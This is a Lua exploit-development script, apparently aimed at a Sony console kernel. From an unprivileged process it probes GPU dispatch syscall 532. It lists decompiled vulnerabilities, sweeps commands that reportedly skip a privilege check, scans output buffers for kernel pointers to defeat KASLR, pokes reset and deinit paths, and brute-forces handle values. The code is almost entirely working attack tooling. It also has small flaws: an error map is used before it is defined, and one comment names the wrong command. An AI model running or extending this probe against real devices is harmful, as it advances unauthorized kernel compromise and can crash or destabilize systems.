-- CRASH_CLASS: MODERATE (unprivileged commands should be safe; deinit could destabilize)
-- PROBE 87a: SYS 532 GPU COMMAND DISPATCH — UNPRIVILEGED COMMANDS
--
-- CRITICAL DISCOVERY: sys 532 is the PRIMARY Sony GPU/compute dispatch syscall
-- with ~70+ sub-operations. Decompiled 13.60 analysis reveals:
--
-- ** Commands 0x18-0x1E, 0x20, 0x2F BYPASS priv_check(td, 682) **
--
-- These ~9 commands are GPU resource management operations accessible to
-- our unprivileged process. sys 532 has NEVER been tested on console.
--
-- Known vulnerabilities from decompile:
-- V1: Integer overflow in size validation (MEDIUM)
-- V2: TOCTOU in handle validation — no locking (MEDIUM-HIGH)
-- V3: Missing bounds check on registration table index (LOW-MEDIUM)
-- V4: Unchecked object pointer from pool lookup (MEDIUM)
-- V5: Missing auth check on deinit path (MEDIUM)
-- V6: Race condition in worker thread state machine (LOW)
-- V7: No rate limiting on registration table writes (LOW)
--
-- Args: (cmd_code, sub_cmd, output_ptr, input_ptr, size)
--
-- SELECT SECTION: Change TEST_SECTION to "A", "B", "C", or "D"

local TEST_SECTION = "B"

print("=== PROBE 87a: SYS 532 GPU DISPATCH — UNPRIVILEGED COMMANDS ===")
print("Section: " .. TEST_SECTION)
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local pid = to_num(syscall.getpid())
print("PID: " .. pid)
print("")

local sc532 = make_syscall(532)

--------------------------------------------------------------------
if TEST_SECTION == "A" then
--------------------------------------------------------------------
print("=== A: REACHABILITY SWEEP — ALL UNPRIVILEGED COMMANDS ===")
print("")
print("Commands 0x18-0x1E skip priv_check(td, 682).")
print("Commands 0x20 and 0x2F also bypass privilege.")
print("Testing each with minimal/zero args first.")
print("")

-- Error code map from decompile
local err_map = {
    [0x800d0201] = "NOT_INIT",
    [0x800d0202] = "NULL_PTR",
    [0x800d0203] = "CMD_NOT_FOUND",
    [0x800d0204] = "HANDLE_CHECKSUM",
    [0x800d0208] = "INVALID_SIZE",
    [0x800d020d] = "ERROR_STATE",
    [0x800d020f] = "COPYIN_FAIL",
    [0x800d0210] = "COPYOUT_FAIL",
    [0x800d0211] = "OBJ_LOOKUP_FAIL",
    [0x800d0212] = "RESOURCE_LIMIT",
    [0x800d0213] = "INIT_FAIL",
    [0x800d0214] = "NO_BASE_PERM",
    [0x800d0216] = "NO_OP_PERM",
    [0x800d0218] = "PERM_NOT_FOUND",
    [0x800d0219] = "SANDBOXED",
    [0x800d021f] = "AUTH_MISMATCH",
}

local function decode_err(val)
    local h, l = get_hi_lo(val)
    local full = h * 0x100000000 + l
    if err_map[l] then return err_map[l] end
    if err_map[full] then return err_map[full] end
    return ""
end

local outbuf = memory.alloc(0x1000)
local inbuf = memory.alloc(0x1000)

-- Unprivileged commands: 0x18-0x1E, 0x20, 0x2F
local unpriv_cmds = {0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x2F}

-- Test 1: Zero args (cmd only)
print("--- Test 1: Zero-arg reachability ---")
for _, cmd in ipairs(unpriv_cmds) do
    -- Zero output buffer
    for i = 0, 0x3F do safe_wd(outbuf + i * 4, 0) end

    local ok, ret = pcall(function()
        return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(0), uint64(0))
    end)
    local rv = ok and ret or -999
    local h, l = 0, 0
    if ok then h, l = get_hi_lo(ret) end
    local err = decode_err(ret)
    print(string.format("  cmd 0x%02X: ret=%s [%s]", cmd, fmt(rv), err))

    -- Check first 16 bytes of output
    local o0 = safe_rd(outbuf)
    local o4 = safe_rd(outbuf + 4)
    local o8 = safe_rd(outbuf + 8)
    local oc = safe_rd(outbuf + 12)
    if (o0 and o0 ~= 0) or (o4 and o4 ~= 0) then
        print(string.format("    out: +0=%08X +4=%08X +8=%08X +C=%08X",
            o0 or 0, o4 or 0, o8 or 0, oc or 0))
    end

    local pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("  *** PROCESS KILLED BY CMD 0x" .. string.format("%02X", cmd) .. " ***")
        break
    end
end
print("")

-- Test 2: With output pointer and small input
print("--- Test 2: With valid output + small input ---")
for _, cmd in ipairs(unpriv_cmds) do
    for i = 0, 0xFF do safe_wd(outbuf + i * 4, 0) end
    safe_wd(inbuf, 0)
    safe_wd(inbuf + 4, 0)

    local ok, ret = pcall(function()
        return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(inbuf), uint64(4))
    end)
    local rv = ok and ret or -999
    local err = decode_err(ret)
    print(string.format("  cmd 0x%02X size=4: ret=%s [%s]", cmd, fmt(rv), err))

    local pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("  *** KILLED ***")
        break
    end
end
print("")

-- Test 3: Also test a few PRIVILEGED commands to confirm they're blocked
print("--- Test 3: Privileged commands (expect rejection) ---")
local priv_cmds = {0x00, 0x03, 0x05, 0x10}
for _, cmd in ipairs(priv_cmds) do
    local ok, ret = pcall(function()
        return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(0), uint64(0))
    end)
    local rv = ok and ret or -999
    local err = decode_err(ret)
    print(string.format("  cmd 0x%02X: ret=%s [%s]", cmd, fmt(rv), err))

    local pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("  *** KILLED ***")
        break
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "B" then
--------------------------------------------------------------------
print("=== B: CMD 0x20 CONFIG QUERY — POTENTIAL KASLR DEFEAT ===")
print("")
print("cmd 0x20 is unprivileged, copies 0x30 (48) bytes of config back.")
print("Scanning all output bytes for kernel pointers.")
print("")

local outbuf = memory.alloc(0x200)
local inbuf = memory.alloc(0x40)

-- Zero both buffers
for i = 0, 0x7F do safe_wd(outbuf + i * 4, 0) end
for i = 0, 0xF do safe_wd(inbuf + i * 4, 0) end

-- Test 1: cmd 0x20, sub=0
print("--- Test 1: cmd=0x20 sub=0 ---")
local ok1, ret1 = pcall(function()
    return sc532(uint64(0x20), uint64(0), uint64(outbuf), uint64(inbuf), uint64(0x30))
end)
local rv1 = ok1 and ret1 or -999
print("ret=" .. fmt(rv1))

local pid_c = to_num(syscall.getpid())
if pid ~= pid_c then
    print("*** KILLED ***")
else
    -- Dump all 48 bytes of output
    print("Output buffer (0x30 bytes):")
    for off = 0, 0x28, 8 do
        local val = safe_rq(outbuf + off)
        if val then
            local h, l = get_hi_lo(val)
            local kptr = (h >= 0xFFFF8000) and " *** KERNEL PTR ***" or ""
            print(string.format("  +0x%02X: %s%s", off, fmt(val), kptr))
        end
    end
    print("")

    -- Test with different sub-commands
    print("--- Test 2: sub-command sweep ---")
    for sub = 0, 15 do
        for i = 0, 0x7F do safe_wd(outbuf + i * 4, 0) end

        local ok_s, ret_s = pcall(function()
            return sc532(uint64(0x20), uint64(sub), uint64(outbuf), uint64(inbuf), uint64(0x30))
        end)
        local rv_s = ok_s and ret_s or -999
        local h, l = 0, 0
        if ok_s then h, l = get_hi_lo(ret_s) end

        -- Check if any output differs from sub=0
        local o0 = safe_rd(outbuf)
        local o4 = safe_rd(outbuf + 4)
        print(string.format("  sub=%d: ret=%s out[0]=%08X out[4]=%08X",
            sub, fmt(rv_s), o0 or 0, o4 or 0))

        -- Scan for kernel pointers in output
        for off = 0, 0x28, 8 do
            local val = safe_rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 then
                    print(string.format("    *** KERNEL PTR at +0x%02X: %s ***", off, fmt(val)))
                end
            end
        end

        pid_c = to_num(syscall.getpid())
        if pid ~= pid_c then
            print("  *** KILLED at sub=" .. sub .. " ***")
            break
        end
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "C" then
--------------------------------------------------------------------
print("=== C: DEEP PROBE — UNPRIVILEGED COMMANDS 0x18-0x1E ===")
print("")
print("Testing each command with varying sub-commands and sizes.")
print("These are GPU resource management ops — looking for:")
print("  - Kernel pointers in output")
print("  - Memory mapping capabilities")
print("  - Resource creation that returns handles")
print("")

local outbuf = memory.alloc(0x1000)
local inbuf = memory.alloc(0x900)  -- max copyin 0x819 for 0x1A-0x1D

-- Commands 0x1A-0x1D have larger copyin (0x819 bytes)
-- Format the input buffer as a GPU resource descriptor

-- Test each unprivileged command in depth
local cmds = {0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E}

for _, cmd in ipairs(cmds) do
    print(string.format("--- cmd 0x%02X deep test ---", cmd))

    -- Determine max size
    local max_size = 0x801
    if cmd >= 0x1A and cmd <= 0x1D then max_size = 0x819 end

    -- Test A: sub-command sweep (0-7)
    for sub = 0, 7 do
        for i = 0, 0xFF do safe_wd(outbuf + i * 4, 0) end
        for i = 0, 0x3F do safe_wd(inbuf + i * 4, 0) end

        local ok_s, ret_s = pcall(function()
            return sc532(uint64(cmd), uint64(sub), uint64(outbuf), uint64(inbuf), uint64(4))
        end)
        local rv_s = ok_s and ret_s or -999
        local h, l = 0, 0
        if ok_s then h, l = get_hi_lo(ret_s) end

        local o0 = safe_rd(outbuf)
        local summary = ""
        if o0 and o0 ~= 0 then
            summary = string.format(" out[0]=%08X", o0)
        end
        print(string.format("  sub=%d size=4: ret=%s%s", sub, fmt(rv_s), summary))

        local pid_c = to_num(syscall.getpid())
        if pid ~= pid_c then
            print("  *** KILLED ***")
            break
        end
    end

    -- Test B: With larger input buffer (for 0x1A-0x1D)
    if cmd >= 0x1A and cmd <= 0x1D then
        for i = 0, 0x200 do safe_wd(inbuf + i * 4, 0) end
        for i = 0, 0xFF do safe_wd(outbuf + i * 4, 0) end

        -- Populate minimal resource descriptor fields
        safe_wd(inbuf, 1)      -- some ID
        safe_wd(inbuf + 4, 1)  -- version
        safe_wd(inbuf + 8, 0x100)  -- size

        local ok_b, ret_b = pcall(function()
            return sc532(uint64(cmd), uint64(0), uint64(outbuf), uint64(inbuf), uint64(0x100))
        end)
        local rv_b = ok_b and ret_b or -999
        print(string.format("  large_input: ret=%s", fmt(rv_b)))

        -- Scan output for kernel pointers
        for off = 0, 0x40, 8 do
            local val = safe_rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 then
                    print(string.format("    *** KERNEL PTR at +0x%02X: %s ***", off, fmt(val)))
                end
            end
        end
    end

    local pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("*** KILLED at cmd 0x" .. string.format("%02X", cmd) .. " ***")
        break
    end
    print("")
end

-- Test cmd 0x2F (also unprivileged)
print("--- cmd 0x2F deep test ---")
for sub = 0, 3 do
    for i = 0, 0xFF do safe_wd(outbuf + i * 4, 0) end
    for i = 0, 0xF do safe_wd(inbuf + i * 4, 0) end

    local ok_f, ret_f = pcall(function()
        return sc532(uint64(0x2F), uint64(sub), uint64(outbuf), uint64(inbuf), uint64(4))
    end)
    local rv_f = ok_f and ret_f or -999
    print(string.format("  sub=%d: ret=%s", sub, fmt(rv_f)))

    local pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then
        print("  *** KILLED ***")
        break
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "D" then
--------------------------------------------------------------------
print("=== D: DEINIT VULNERABILITY + HANDLE PROBING ===")
print("")
print("V5: Deinit path has NO priv_check.")
print("Testing if we can trigger subsystem teardown/reinit.")
print("Also probing handle validation for info leaks.")
print("")

local outbuf = memory.alloc(0x1000)
local inbuf = memory.alloc(0x100)

-- Test 1: Try to find the init/deinit trigger
-- The decompile shows state 0=init, 1=deinit, 2=reinit
-- This is at sub-function 0x38A0, need to find which command triggers it
print("--- Test 1: Init/status commands ---")

-- cmd 0x00 = "Get status" — try it first (privileged, but worth seeing error)
for i = 0, 0x3F do safe_wd(outbuf + i * 4, 0) end
safe_wd(inbuf, 0)

local ok_s, ret_s = pcall(function()
    return sc532(uint64(0), uint64(0), uint64(outbuf), uint64(0), uint64(0))
end)
print("cmd 0x00 (status): ret=" .. fmt(ok_s and ret_s or -999))

local pid_c = to_num(syscall.getpid())
if pid ~= pid_c then
    print("*** KILLED ***")
else
    -- Test 2: cmd 0x0A = "Toggle mode" (privileged, but test)
    local ok_a, ret_a = pcall(function()
        return sc532(uint64(0x0A), uint64(0), uint64(outbuf), uint64(0), uint64(0))
    end)
    print("cmd 0x0A (toggle): ret=" .. fmt(ok_a and ret_a or -999))

    pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then print("*** KILLED ***") end
end

if pid == to_num(syscall.getpid()) then
    -- Test 3: cmd 0x0E = "Reset" (privileged)
    local ok_r, ret_r = pcall(function()
        return sc532(uint64(0x0E), uint64(0), uint64(outbuf), uint64(0), uint64(0))
    end)
    print("cmd 0x0E (reset): ret=" .. fmt(ok_r and ret_r or -999))

    pid_c = to_num(syscall.getpid())
    if pid ~= pid_c then print("*** KILLED ***") end
end

if pid == to_num(syscall.getpid()) then
    -- Test 4: Handle brute-force with unprivileged cmd
    -- Handles are XOR-encoded with integrity checksum
    -- Try common patterns to see what errors we get
    print("")
    print("--- Test 4: Handle error fingerprinting ---")
    local test_handles = {
        0, 1, 0xFF, 0xFFFF, 0xFFFFFFFF,
        0x6B,  -- XOR key for type index
        0x6B6B6B6B,
    }

    for _, hval in ipairs(test_handles) do
        for i = 0, 0x3F do safe_wd(outbuf + i * 4, 0) end
        -- Use cmd 0x20 (unprivileged) with handle-like values in input
        safe_wd(inbuf, hval)
        safe_wd(inbuf + 4, 0)

        local ok_h, ret_h = pcall(function()
            return sc532(uint64(0x18), uint64(hval), uint64(outbuf), uint64(inbuf), uint64(8))
        end)
        local rv_h = ok_h and ret_h or -999
        local err = ""
        if ok_h then
            local rh, rl = get_hi_lo(ret_h)
            if err_map then
                local code = rl
                if err_map[code] then err = err_map[code] end
            end
        end
        print(string.format("  handle=0x%08X: ret=%s [%s]", hval, fmt(rv_h), err))

        pid_c = to_num(syscall.getpid())
        if pid ~= pid_c then
            print("  *** KILLED ***")
            break
        end
    end
end

if pid == to_num(syscall.getpid()) then
    -- Test 5: Try cmd 0x31 (Version/capability query) — might leak info
    print("")
    print("--- Test 5: cmd 0x31 version query ---")
    for i = 0, 0xFF do safe_wd(outbuf + i * 4, 0) end
    safe_wd(inbuf, 1)
    safe_wd(inbuf + 4, 0)

    local ok_v, ret_v = pcall(function()
        return sc532(uint64(0x31), uint64(0), uint64(outbuf), uint64(inbuf), uint64(8))
    end)
    print("cmd 0x31 (version): ret=" .. fmt(ok_v and ret_v or -999))

    -- Dump output
    for off = 0, 0x30, 4 do
        local val = safe_rd(outbuf + off)
        if val and val ~= 0 then
            print(string.format("  out+0x%02X: 0x%08X", off, val))
        end
    end
end

-- NOTE: err_map not defined in this section, define locally
local err_map = {
    [0x800d0201] = "NOT_INIT",
    [0x800d0202] = "NULL_PTR",
    [0x800d0203] = "CMD_NOT_FOUND",
    [0x800d0208] = "INVALID_SIZE",
    [0x800d0214] = "NO_BASE_PERM",
    [0x800d0216] = "NO_OP_PERM",
    [0x800d0218] = "PERM_NOT_FOUND",
    [0x800d0219] = "SANDBOXED",
}

end -- TEST_SECTION

print("")
local final_pid = to_num(syscall.getpid())
print("Final PID: " .. final_pid .. (pid == final_pid and " OK" or " CHANGED!"))
print("=== PROBE 87a SECTION " .. TEST_SECTION .. " COMPLETE ===")

